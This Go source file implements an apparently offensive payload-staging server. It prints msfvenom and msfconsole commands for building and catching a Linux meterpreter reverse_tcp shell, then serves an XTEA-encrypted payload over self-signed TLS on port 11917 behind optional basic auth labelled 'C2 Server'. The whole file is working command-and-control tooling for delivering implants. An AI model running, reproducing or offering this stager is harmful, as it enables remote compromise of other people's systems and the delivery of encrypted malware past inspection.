package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"

	"github.com/b1gcat/core/pki"
)

var (
	key         []byte
	payloadType string
	payloadPath string
	username    string
	password    string
)

func main() {
	fmt.Println("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${host} LPORT=${port} -f raw > runtime.bin")
	fmt.Println(`
	   msfconsole
   use exploit/multi/handler
   set PAYLOAD linux/x64/meterpreter/reverse_tcp
   set LHOST host
   set LPORT port
   run

	`)
	// Define command line flags
	keyFlag := flag.String("key", "", "16-byte key for XTEA encryption (in hex format, e.g., 000102030405060708090a0b0c0d0e0f)")
	typeFlag := flag.String("type", "", "Payload type (payload or binary)")
	pathFlag := flag.String("path", "", "Payload file path")
	userFlag := flag.String("username", "", "Username for basic authentication")
	passFlag := flag.String("password", "", "Password for basic authentication")

	// Parse flags
	flag.Parse()

	// Validate required flags
	if *keyFlag == "" || *typeFlag == "" || *pathFlag == "" {
		flag.PrintDefaults()
		os.Exit(1)
	}

	// Set username and password if provided
	username = *userFlag
	password = *passFlag

	// Validate key length
	if len(*keyFlag) != 32 {
		log.Fatalf("Key must be 32 hex characters (16 bytes)")
	}

	// Validate payload type
	if *typeFlag != "payload" && *typeFlag != "binary" {
		log.Fatalf("Payload type must be either 'payload' or 'binary'")
	}

	// Validate payload file exists
	if _, err := os.Stat(*pathFlag); os.IsNotExist(err) {
		log.Fatalf("Payload file does not exist: %s", *pathFlag)
	}

	// Parse key from hex string
	key = make([]byte, 16)
	for i := 0; i < 16; i++ {
		fmt.Sscanf((*keyFlag)[2*i:2*i+2], "%02x", &key[i])
	}

	// Set payload type and path
	payloadType = *typeFlag
	payloadPath = *pathFlag

	// Generate self-signed certificate
	cert, err := pki.GenerateSelfSignedCert()
	if err != nil {
		log.Fatalf("Failed to generate self-signed certificate: %v", err)
	}

	// Create HTTP server with TLS configuration
	server := &http.Server{
		Addr:    ":11917",
		Handler: http.HandlerFunc(handler),
		TLSConfig: &tls.Config{
			Certificates: []tls.Certificate{*cert},
		},
	}

	// Log server start
	fmt.Println("Available endpoints:")
	fmt.Println("  - https://localhost:11917/ - Download the configured payload")
	fmt.Printf("  - Decryption Key: %x\n", key)
	fmt.Printf("  - Payload Type: %s\n", payloadType)
	fmt.Printf("  - Payload Path: %s\n", payloadPath)

	// Start server
	if err := server.ListenAndServeTLS("", ""); err != nil && err != http.ErrServerClosed {
		log.Fatalf("Failed to start server: %v", err)
	}
}

// checkBasicAuth checks if the request has valid basic authentication credentials
func checkBasicAuth(r *http.Request) bool {
	// If username and password are not set, skip authentication
	if username == "" && password == "" {
		return true
	}

	// Get username and password from request headers
	reqUsername, reqPassword, ok := r.BasicAuth()
	if !ok {
		return false
	}

	// Check if credentials match
	return reqUsername == username && reqPassword == password
}

// handler handles HTTP requests
func handler(w http.ResponseWriter, r *http.Request) {
	// Log request details
	clientIP := r.RemoteAddr
	requestMethod := r.Method
	requestPath := r.URL.Path

	// Check basic authentication
	if !checkBasicAuth(r) {
		log.Printf("[ACCESS] %s %s %s - 401 Unauthorized (Authentication failed)", clientIP, requestMethod, requestPath)
		w.Header().Set("WWW-Authenticate", `Basic realm="C2 Server"`)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	log.Printf("[ACCESS] %s %s %s - 200 OK (Authentication successful)", clientIP, requestMethod, requestPath)

	// For any other request, serve the payload specified by command line flags
	handlePayloadRequest(w, r)
}

func handlePayloadRequest(w http.ResponseWriter, r *http.Request) {
	// Read payload file from the path specified by command line flag
	fileContent, err := os.ReadFile(payloadPath)
	if err != nil {
		log.Printf("Failed to read payload file %s: %v", payloadPath, err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	// Construct full payload: first line is type, rest is file content
	fullPayload := fmt.Sprintf("%s\n%s", payloadType, string(fileContent))

	// Encrypt the payload using XTEA
	encryptedPayload, err := pki.Encrypt(key, []byte(fullPayload))
	if err != nil {
		log.Printf("Failed to encrypt payload: %v", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	// Set response headers
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(encryptedPayload)))
	w.WriteHeader(http.StatusOK)

	// Write encrypted payload to response
	if _, err := w.Write(encryptedPayload); err != nil {
		log.Printf("Failed to write response: %v", err)
	}
}
